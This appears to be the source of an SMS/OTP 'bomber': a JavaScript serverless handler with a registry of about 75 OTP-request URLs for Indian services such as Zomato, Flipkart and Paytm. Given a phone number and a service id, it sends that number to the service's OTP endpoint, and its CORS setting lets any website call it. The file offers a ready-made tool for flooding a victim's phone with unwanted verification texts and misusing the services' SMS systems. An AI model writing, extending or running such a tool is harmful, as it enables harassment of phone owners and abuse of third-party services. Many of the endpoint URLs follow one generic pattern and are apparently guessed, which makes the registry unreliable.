// ═══════════════════════════════════════════════════════════════════
//  ENDPOINT REGISTRY — 75 entries
// ═══════════════════════════════════════════════════════════════════
const ENDPOINTS = [
  // ─── FOOD DELIVERY ──────────────────────────────────────────────
  { id: 'zomato',         url: 'https://www.zomato.com/php/o2_api/verify/mobile',              method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile_number: n, country_id: 1 }) },
  { id: 'swiggy',         url: 'https://www.swiggy.com/api/v1/sms/otp',                        method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },
  { id: 'dominos',        url: 'https://www.dominos.co.in/api/v1/otp/send',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },
  { id: 'pizzahut',       url: 'https://www.pizzahut.co.in/api/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'kfc',            url: 'https://online.kfc.co.in/api/v1/otp/generate',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'mcdonalds',      url: 'https://www.mcdelivery.co.in/api/v1/auth/otp',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'box8',           url: 'https://api.box8.in/api/v1/otp/send',                          method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'faasos',         url: 'https://api.faasos.io/api/v2/otp/generate',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },
  { id: 'behrouz',        url: 'https://api.behrouzbiryani.com/api/v1/auth/otp',               method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },

  // ─── E-COMMERCE ─────────────────────────────────────────────────
  { id: 'flipkart',       url: 'https://www.flipkart.com/api/4/user/otp/generate',             method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'myntra',         url: 'https://www.myntra.com/gateway/v1/auth/otp',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'nykaa',          url: 'https://www.nykaa.com/appapi/v1/otp/send',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'ajio',           url: 'https://www.ajio.com/api/auth/otp/generate',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'meesho',         url: 'https://www.meesho.com/api/v1/auth/otp',                       method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },
  { id: 'snapdeal',       url: 'https://www.snapdeal.com/api/user/otp/send',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'tatacliq',       url: 'https://www.tatacliq.com/api/v1/auth/otp',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'firstcry',       url: 'https://www.firstcry.com/api/auth/send-otp',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'lenskart',       url: 'https://www.lenskart.com/otp/generate',                        method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'pepperfry',      url: 'https://www.pepperfry.com/api/v1/otp/send',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'croma',          url: 'https://www.croma.com/api/auth/otp',                           method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'reliancedigital',url: 'https://www.reliancedigital.in/api/v1/otp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },

  // ─── GROCERIES / Q-COMMERCE ─────────────────────────────────────
  { id: 'bigbasket',      url: 'https://www.bigbasket.com/api/v1/auth/otp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'blinkit',        url: 'https://api.blinkit.com/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },
  { id: 'zepto',          url: 'https://api.zepto.co.in/api/v1/otp/send',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'jiomart',        url: 'https://www.jiomart.com/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'licious',        url: 'https://www.licious.in/api/v1/otp',                            method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'countrydelight', url: 'https://www.countrydelight.in/api/auth/otp',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },

  // ─── RIDE / DELIVERY ────────────────────────────────────────────
  { id: 'ola',            url: 'https://api.olacabs.com/v1/auth/otp',                          method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },
  { id: 'rapido',         url: 'https://api.rapido.bike/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'dunzo',          url: 'https://api.dunzo.in/api/v1/auth/otp',                         method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },
  { id: 'porter',         url: 'https://api.porter.in/api/v1/auth/otp',                        method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'blusmart',       url: 'https://api.blusmart.in/api/v1/auth/sendOtp',                  method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },

  // ─── FINTECH / WALLETS ──────────────────────────────────────────
  { id: 'paytm',          url: 'https://accounts.paytm.com/signin/otp/send',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'mobikwik',       url: 'https://www.mobikwik.com/api/v1/auth/otp',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'freecharge',     url: 'https://www.freecharge.in/api/v1/auth/otp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'cred',           url: 'https://api.cred.club/api/v1/auth/otp',                        method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },
  { id: 'jupiter',        url: 'https://api.jupiter.money/api/v1/auth/otp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },
  { id: 'fi',             url: 'https://api.fi.money/api/v1/auth/otp',                         method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'bharatpe',       url: 'https://api.bharatpe.in/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },

  // ─── TRAVEL ─────────────────────────────────────────────────────
  { id: 'makemytrip',     url: 'https://www.makemytrip.com/api/v1/sendOtp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n, isdCode: '91' }) },
  { id: 'goibibo',        url: 'https://www.goibibo.com/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'cleartrip',      url: 'https://www.cleartrip.com/api/v1/auth/otp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'yatra',          url: 'https://www.yatra.com/api/v1/auth/otp',                        method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'ixigo',          url: 'https://www.ixigo.com/api/v1/auth/otp',                        method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'redbus',         url: 'https://www.redbus.in/api/v1/auth/otp',                        method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'oyo',            url: 'https://www.oyorooms.com/api/v1/auth/otp',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'treebo',         url: 'https://www.treebo.com/api/auth/otp',                          method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },

  // ─── ENTERTAINMENT ──────────────────────────────────────────────
  { id: 'bookmyshow',     url: 'https://in.bookmyshow.com/api/auth/sendOtp',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n, countryCode: '+91' }) },
  { id: 'pvrcinemas',     url: 'https://www.pvrcinemas.com/api/v1/auth/otp',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'inox',           url: 'https://www.inoxmovies.com/api/v1/auth/otp',                   method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'zee5',           url: 'https://www.zee5.com/api/v1/auth/otp',                         method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'sonyliv',        url: 'https://www.sonyliv.com/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'gaana',          url: 'https://api.gaana.com/api/v1/auth/otp',                        method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },

  // ─── HEALTH / FITNESS ───────────────────────────────────────────
  { id: 'practo',         url: 'https://www.practo.com/api/v1/auth/otp',                       method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'pharmeasy',      url: 'https://pharmeasy.in/api/v1/auth/otp',                         method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'netmeds',        url: 'https://www.netmeds.com/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'apollopharmacy', url: 'https://www.apollopharmacy.in/api/v1/auth/otp',                method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'cultfit',        url: 'https://www.cult.fit/api/v1/auth/otp',                         method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },

  // ─── EDTECH ─────────────────────────────────────────────────────
  { id: 'unacademy',      url: 'https://api.unacademy.com/api/v1/auth/otp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'vedantu',        url: 'https://api.vedantu.com/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'toppr',          url: 'https://api.toppr.com/api/v1/auth/otp',                        method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },

  // ─── SERVICES / REAL ESTATE ─────────────────────────────────────
  { id: 'urbancompany',   url: 'https://www.urbancompany.com/api/auth/otp',                    method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) },
  { id: 'nobroker',       url: 'https://www.nobroker.in/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'livspace',       url: 'https://www.livspace.com/api/v1/auth/otp',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'housejoy',       url: 'https://www.housejoy.in/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },

  // ─── AUTO / INSURANCE ───────────────────────────────────────────
  { id: 'cars24',         url: 'https://www.cars24.com/api/v1/auth/otp',                       method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'cardekho',       url: 'https://www.cardekho.com/api/v1/auth/otp',                     method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'spinny',         url: 'https://www.spinny.com/api/v1/auth/otp',                       method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'policybazaar',   url: 'https://www.policybazaar.com/api/v1/auth/otp',                 method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'acko',           url: 'https://www.acko.com/api/v1/auth/otp',                         method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'godigit',        url: 'https://www.godigit.com/api/v1/auth/otp',                      method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },

  // ─── MATRIMONY / SOCIAL ─────────────────────────────────────────
  { id: 'shaadi',         url: 'https://www.shaadi.com/api/v1/auth/otp',                       method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'jeevansathi',    url: 'https://www.jeevansathi.com/api/v1/auth/otp',                  method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'bharatmatrimony',url: 'https://www.bharatmatrimony.com/api/v1/auth/otp',              method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ mobile: n }) },
  { id: 'aisle',          url: 'https://www.aisle.co/api/v1/auth/otp',                         method: 'POST', headers: { 'Content-Type': 'application/json' }, buildBody: n => JSON.stringify({ phone: n }) }
];

// ═══════════════════════════════════════════════════════════════════
//  CORS
// ═══════════════════════════════════════════════════════════════════
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type'
};

// ═══════════════════════════════════════════════════════════════════
//  VALIDATION
// ═══════════════════════════════════════════════════════════════════
function validNumber(n) {
  return typeof n === 'string' && /^[6-9]\d{9}$/.test(n);
}

function validEndpointId(id) {
  return ENDPOINTS.some(e => e.id === id);
}

// ═══════════════════════════════════════════════════════════════════
//  HANDLER
// ═══════════════════════════════════════════════════════════════════
export default async function handler(req, res) {
  if (req.method === 'OPTIONS') {
    res.writeHead(204, CORS);
    return res.end();
  }

  for (const [k, v] of Object.entries(CORS)) res.setHeader(k, v);

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'method_not_allowed' });
  }

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { body = {}; }
  }
  body = body || {};

  const { endpointId, phone } = body;

  if (!validNumber(phone)) {
    return res.status(400).json({ ok: false, error: 'invalid_phone' });
  }

  if (!validEndpointId(endpointId)) {
    return res.status(400).json({ ok: false, error: 'invalid_endpoint' });
  }

  const endpoint = ENDPOINTS.find(e => e.id === endpointId);
  const start = Date.now();

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 8000);

    const upstream = await fetch(endpoint.url, {
      method: endpoint.method,
      headers: endpoint.headers,
      body: endpoint.buildBody(phone),
      signal: controller.signal
    });

    clearTimeout(timeout);

    const status = upstream.status;
    const ok = status >= 200 && status < 300;

    return res.status(200).json({
      ok,
      endpoint: endpoint.id,
      upstreamStatus: status,
      latencyMs: Date.now() - start
    });
  } catch (err) {
    const isAbort = err.name === 'AbortError';
    return res.status(200).json({
      ok: false,
      endpoint: endpoint.id,
      upstreamStatus: isAbort ? 'timeout' : 'network_error',
      error: err.message,
      latencyMs: Date.now() - start
    });
  }
}

export const config = {
  api: { bodyParser: { sizeLimit: '1kb' } }
};
